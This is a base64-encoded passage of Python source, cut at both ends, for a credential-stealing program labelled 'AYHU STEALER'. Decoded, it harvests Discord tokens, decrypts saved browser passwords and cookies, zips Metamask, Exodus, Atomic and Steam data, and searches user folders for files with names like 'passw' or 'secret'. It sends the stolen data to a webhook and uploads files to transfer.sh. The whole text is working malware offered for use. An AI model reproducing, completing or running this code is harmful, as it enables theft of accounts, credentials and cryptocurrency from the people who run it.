cyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykNCiAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykNCg0KZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToNCiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiDQogICAgd2l0aCBvcGVuKHBhdGgsIG1vZGU9J3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICBmLndyaXRlKGYiPC0tQVlIVSBTVEVBTEVSIEJFU1QgLS0+XG5cbiIpDQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6DQogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpDQoNClRva2VucyA9ICcnDQpkZWYgZ2V0VG9rZW4ocGF0aCwgYXJnKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aCArPSBhcmcNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6DQogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkNCg0KUGFzc3cgPSBbXQ0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIFBhc3N3DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQ0KICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykNCg0KQ29va2llcyA9IFtdDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgaWYgcm93WzBdICE9ICcnOg0KICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6DQogICAgICAgICAgICAgICAgb2xkID0gd2ENCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOg0KICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQ0KICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0NCiAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06DQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQ0KICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgIyBwcmludChbcm93WzBdLCByb3dbMV0sIERlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpXSkNCiAgICB3cml0ZWZvcmZpbGUoQ29va2llcywgJ2Nvb2snKQ0KDQpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZw0KDQogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpDQoNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQ0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuRGVjb2RlZCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbkRlY29kZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkNCg0KDQpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOg0KICAgIHBhdGhDID0gcGF0aA0KICAgIG5hbWUgPSBhcmcNCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpDQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpDQoNCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSINCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4NCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQ0KDQogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSINCg0KICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuDQogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikNCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkNCiAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICBmb3VuZCA9IEZhbHNlDQogICAgICAgIGZvciBsIGluIGRhdGE6DQogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOg0KICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQ0KICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuDQogICAgICAgIG5hbWUgPSBhcmcNCg0KICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpDQogICAgemYuY2xvc2UoKQ0KDQogICAgdXBsb2FkKGYne3BhdGhDfS97bmFtZX0uemlwJykNCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQ0KDQoNCmRlZiBHYXRoZXJBbGwoKToNCiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vVGhvcml1bS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJ0aG9yaXVtLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdDQogICAgXQ0KDQogICAgZGlzY29yZFBhdGhzID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICBdDQoNCiAgICBQYXRoc1RvWmlwID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwNCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQ0KICAgIF0NCg0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpDQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkNCg0KICAgIFRoQ29rayA9IFtdDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkNCg0KICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpDQogICAgREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybg0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6DQogICAgICAgIHRocmVhZC5qb2luKCkNCiAgICBnbG9iYWwgdXB0aHMNCiAgICB1cHRocyA9IFtdDQoNCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXToNCiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpDQoNCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToNCiAgICB0cnk6DQogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0NCiAgICAgICAgLi4uDQogICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpDQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0DQogICAgICAgIHJldHVybiB1cmwNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBtYXhmaWxlc3BlcmRpciA9IDcNCiAgICBpID0gMA0KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQ0KICAgIGZmb3VuZCA9IFtdDQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybg0KICAgICAgICBpICs9IDENCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoNCiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkNCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQ0KDQpLaXdpRmlsZXMgPSBbXQ0KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgZmlmb3VuZCA9IFtdDQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkNCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOg0KICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoNCiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiDQogICAgXQ0KDQogICAga2V5X3dvcmRzRm9sZGVyID0gWw0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJhY291bnQiLA0KICAgICAgICAicGFzc3ciLA0KICAgICAgICAic2VjcmV0Ig0KDQogICAgXQ0KDQogICAga2V5X3dvcmRzRmlsZXMgPSBbDQogICAgICAgICJwYXNzdyIsDQogICAgICAgICJtZHAiLA0KICAgICAgICAibW90ZGVwYXNzZSIsDQogICAgICAgICJtb3RfZGVfcGFzc2UiLA0KICAgICAgICAibG9naW4iLA0KICAgICAgICAic2VjcmV0IiwNCiAgICAgICAgImFjY291bnQiLA0KIC